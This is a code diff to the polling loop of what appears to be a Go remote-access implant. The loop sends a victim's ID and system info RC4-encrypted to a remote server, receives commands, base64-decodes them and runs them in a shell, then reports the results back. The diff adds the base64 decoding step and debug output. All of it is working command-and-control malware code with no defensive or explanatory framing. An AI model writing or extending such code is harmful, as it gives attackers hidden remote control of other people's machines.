@@ -5,9 +5,12 @@ import (
 	"../shell"
 	"../utils"
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"github.com/satori/go.uuid"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"strconv"
 	"time"
@@ -41,38 +44,51 @@ func (c *Core) Pool() {
 
 	client := &http.Client{}
 	for {
-
+		fmt.Println("Loop")
 		time.Sleep(time.Duration(c.sleep) * time.Second)
 		var result []Action
 		data := Work{Uuid: c.uuid, Info: c.info}
 		bytesJson, err := json.Marshal(data)
 		if err != nil {
-			continue
+			fmt.Println(1)
+			log.Fatal(err)
 		}
 		encode := utils.ImmediateRC4(bytesJson)
 		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
 		if err != nil {
-			continue
+			fmt.Println(2)
+			log.Fatal(err)
 		}
 		req.Header.Add("UA", "android")
 		resp, err := client.Do(req)
 		if err != nil {
-			continue
+			log.Fatal(err)
 		}
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
-			continue
+			fmt.Println(3)
+			log.Fatal(err)
 		}
 		decode := utils.ImmediateRC4(body)
+
 		err = json.Unmarshal(decode, &result)
 		if err != nil {
-			continue
+			fmt.Println(4)
+			log.Fatal(err)
 		}
 		for _, i := range result {
 			switch i.Do {
 			case "cmd":
+
+				cmdData, err := base64.StdEncoding.DecodeString(i.Data)
+				if err != nil {
+					c.event = append(c.event, Result{Action: "cmd", Data: err.Error()})
+					break
+				}
+				fmt.Println("cmd", cmdData)
+
 				var cmd shell.Shell
-				err := json.Unmarshal([]byte(i.Data), &cmd)
+				err = json.Unmarshal([]byte(cmdData), &cmd)
 				if err != nil {
 
 					c.event = append(c.event, Result{Action: "cmd", Data: err.Error()})
@@ -102,7 +118,7 @@ func (c *Core) Pool() {
 				}
 			}
 		}
-
+		fmt.Println("Second Loop!")
 		data = Work{Uuid: c.uuid, Result: c.event, Info: c.info, NextSecond: c.sleep}
 		c.event = nil
 		bytesJson, err = json.Marshal(data)
@@ -116,9 +132,9 @@ func (c *Core) Pool() {
 			continue
 		}
 		req.Header.Add("UA", "android")
-		resp, _ = client.Do(req)
-		_, _ = ioutil.ReadAll(resp.Body)
-
+		resp, err = client.Do(req)
+		body, err = ioutil.ReadAll(resp.Body)
+		fmt.Println("Loop End!")
 	}
 }
 
